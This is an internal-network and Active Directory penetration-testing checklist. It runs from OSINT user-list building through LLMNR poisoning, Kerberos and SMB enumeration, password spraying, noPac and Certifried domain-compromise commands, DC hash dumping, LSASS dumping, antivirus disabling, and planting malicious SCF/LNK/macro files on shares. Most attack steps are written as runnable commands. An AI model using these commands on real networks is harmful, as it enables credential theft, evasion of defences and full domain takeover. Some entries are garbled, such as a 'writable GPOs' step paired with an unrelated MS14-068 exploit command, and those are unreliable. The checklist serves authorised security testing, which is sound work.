# OSINT (Userlist generation)
1. Generate user list from **LinkedIn/company website** using `theHarvester` tool
2. Use **hunter.io** to search for emails and get an idea on user naming convention
3. generate list of common passwords schemes including company name

# Network/AD Pentest
1. **[Time Saving]** start **Nessus** (basic network scan) in the background
2. **AD pentesting**
	1. **[Time Saving]** find targets without SMB signing enabled
	```bash
	crackmapexec smb <SUBNET_RANGE> --gen-relay-list <OUT_FILE>
	```
	2. **[Time Saving + Network Poisoning]** start **`Responder`** and start relaying to target list ---> obtain AD naming convention to modify userlist
	```bash
	responder -I <NETWORK_INTERFACE>
	```
	3. **[Time Saving + Social Engineering]** gather creds with fake UPnP devices using **`Evil-SSDP`**
	```bash
	python3 evil_ssdp.py <NETWORK_INTERFACE> --template scanner
	```
	4. **[Identifing Domain Controllers]** Doing a quick **`nmap`** scan searching for DNS, Kerberos or LDAP ports: 53, 88, 389
	```bash
	nmap -p53,88,389 --open <SUBNET_RANGE>
	```
	5. **[DNS Reconnaissance]** Do a reverse DNS lookup bruteforce to find other high-value targets **-->** set priority list for interesting host names
	```bash
	dnsrecon -d <DOMAIN_NAME> -n <SUBNET_RANGE>
	```
	6. **[Time Saving + Username/Share Enumeration]**
		1. Enumerate **Kerberos** with OSINT-Generated wordlist (*shorten according to convention found with responder*)
		```bash
		kerbrute userenum -d <DOMAIN_NAME> --dc <DOMAIN_CONTROLLER> <WORDLIST>
		```
		2. Enumerate **LDAP** (checking if anonymous bind is enabled)
		```bash
		ldapsearch -x -H ldap://<TARGET_IP> -b 'DC=LAB,DC=LOCAL'
		```
		3. Enumerate **SMB** guest/null/anonymous authentication/rid-brute
		```bash
		cme smb <TARGET_IP> -u ''      -p '' --shares --rid-brute
		cme smb <TARGET_IP> -u 'a'     -p '' --shares --rid-brute
		cme smb <TARGET_IP> -u 'guest' -p '' --shares --rid-brute
		```
		4. Enumerate **RPC**
		```bash
		enum4linux-ng -A <TARGET_IP>
		```
	7. **[Low-Hanging Fruit | Domain Controllers/Other Windows Hosts]**
		1. **Zero Logon** --> don't forget to restore password to avoid instability
		2. Try Eternal Blue
	8. **[Low-Hanging Fruit | Exchange]** Test for **Proxy Logon**
	9. **[Identifying ADCS + Other Web Services]**
		1. Run `nmap` scan for port 80
		```bash
		nmap --open -p 80,443 <SUBNET_RANGE> -oG web_services.txt
		```
		2. `curl` for the `certsrv` web directory --> perform **PetitPotam Attack**
		```bash
		curl -v http://<SERVER_IP>/certsrv
		```
	10. **[Unauthenticated AD Attacks | ASREPRoasing]** got a userlist? --> **ASREPRoast**
	```bash
	GetNPUsers.py -debug -dc-ip <DOMAIN_CONTROLLER_IP> -request -usersfile <FOUND_USERNAMES_LIST> <DOMAIN_NAME>/
	```
	11. **[Unauthenticated AD Attacks | Password Spraying]**
		1. First, try to obtain the **Domain Password Policy**
		```bash
		crackmapexec smb <DC_IP> -u '' -p '' --pass-pol
		```
		2. Start spraying with:
			1. Most common passwords
			2. Usernames as passwords
			3. Company-name conventions
	12. **[Authenticated AD Attacks without shell access]**  
		1. Domain Controller <= Microsoft Server 2012 R2? --> MS14-068 (a.k.a pykek)
		2. **ADCS found?**
			1. check for **samAccountName spoofing**
			```bash
			python noPac.py <DOMAIN_NAME>/<USERNAME>:'<PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> -dc-host <DOMAIN_CONTROLLER_FQDN> -shell --impersonate administrator
			```
			2. CVE-2022-26923 (a.k.a certifried)
			```bash
			certipy account create <DOMAIN_FQDN>/<AD_USER>@<DC_IP> -user '<NEW_COMPUTER_NAME>' -dns <DC_FQDN>
			certipy req -dc-ip <DC_IP> <DOMAIN_FQDN>/'<ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -ca <CA_NAME> -template Machine
			certipy auth -pfx <GENERATED_PFX_CERTIFICATE>
			secretsdump.py -just-dc <DOMAIN_FQDN>/'<DC_NAME_ENDING_WITH_DOLLAR_SIGN>'@<DC_IP> -hashes :<RETRIEVED_HASH>
			```
		1. check for writable GPOs
		```bash
		python ms14-068.py -u <USERNAME>@<DOMAIN_NAME> -p <USER_PASSWORD> -s <USER_SID> -d <DOMAIN_CONTROLLER_IP>
		```
		3. Search for **shell access** using SMB/WinRM
		```bash
		cme smb <SUBNET_RANGE> -u <USERNAME> -p <PASSWORD>
		cme winrm <SUBNET_RANGE> -u <USERNAME> -p <PASSWORD>
		```
		3. **MS Exchange found?** --> use `privexchange` relay attack to domain admin
		4. **Drop the MIC** (CVE-2019-1040)
		5. **Remote Print Nightmare** CVE-2021-1675
		7. Retrieve all AD users
			1. Do another full **ASREPRoast**
			2. Check for **stored passwords** in user description field (`ldapdomaindump` or `Get-ADUser` from a RSAT-enabled & Network Authenticated user)
		8. Retrieve full AD computer list --> check for interesting computers to target
		9. **Kerberoast**
		10. Run **Bloodhound**
			1. Conduct **ACL attacks** with `powerview` to abuse **dangerous rights** (ex: password reset)
			2. Abuse high privilege group memberships
				1. **DNSAdmins** --> Escalate to domain admin via DLL hijacking
				2. **Exchange Windows Permissions** --> DCSync
				3. **Backup Operators** --> backup `NTDS.dit`
				4. **LAPS Group** --> Ability to read **LAPS** passwords
				5. **gMSA Group** Ability to read **gMSA** passwords
				6. **Exchange Windows Permissions** --> DCSync
				7. **Key Admins/Enterprise Key Admins** With ADCS, do shadow credentials --> DCSync
				8. **Account Operators** --> modify group memberships --> exploit all above abilities from group memberships
				9. **Server Operators** --> administrative access to non-domain controller servers
			3. Locate computers where domain admins are logged in
			4. Check for **readable LAPS passwords**
		11. Enumerate **Group Policy Preferences** (MS14-025)
		12. Enumerate **SMB** share access with the obtained user using `crackmapexec` `--shares` module
			1. Passwords in files? --> search for keywords like "password" "creds" in readable files
			2. writable SMB share? --> plant **SCF/LNK/INI** file/malicious office document (macro attack) with interesting name (*to attract a user to open it*)
		13. Check for **Kerberos contrained/unconstrained delegation**
	13. **[Authenticated Attacks with shell/rdp access]** got user?
		1. **[Local Privilege Escalation]** Run **WinPEAS** --> regular windows pricesc paths
		2. **[Local Privilege Escalation]** `SeImpersonatePrivilege`? Abuse Potato attacks (SweetPotato)
		3. **[Local Privilege Escalation]** test **Local Print Nightmare** CVE-2021-1675
		4. **[Local Privilege Escalation]** **SMBGHost** CVE-2020-0796
		5. **[Local Privilege Escalation]** **HiveNightmare/SeriousSam** 2021-36934
		6. **[Local Privilege Escalation]** NetNTLMv1 found? Coerce with `petitpotam` and submit hash for cracking on [crack.sh](https://crack.sh/)
	14. **[After gaining Administrative Access]** got local admin?
		1. Dump SAM and get local admin NTLM hash
			1. **Pass-the-Hash** and spray the network using `crackmapexec` to check for reused local admin password
			2. Attempt password cracking and stuffing them accross all other authentication channels
			3. **[Antivrus Evasion]** found Antivirus?
				1. Attempt uninstalling
				2. Attempt stopping/disabling its services
				3. Attempt deleting its unprotected files
				4. Attempt obfuscating powershell scripts using `Invoke-Obfuscation`
			4. Attempt Dumping **LSASS** Memory
				1. Task Manager
				2. **procdump**
				3. rundll
				4. **Powersploit** outminidump.ps1
				5. if Avast AV found, try using it to dump LSASS
			5. Domain Admin Logged in? --> Impersonate tokens with `incognito.exe`
3. **[Resume Network Exploitation]** Retrieve Nessus scan results
	1. Find most (critical + exploitable) vulnerabilities
	2. Check for known, safe and trusted exploits on
		1. **Metasploit**
		2. **ExploitDB**
		3. **GitHub** PoCs (review source code before execution)
	3. Check for clear-text protocols and perform MitM attacks (ARP poisoning)
	4. Attack common applications with specialized tools (ex: Oracle --> ODAT)
	5. Check for **log4j**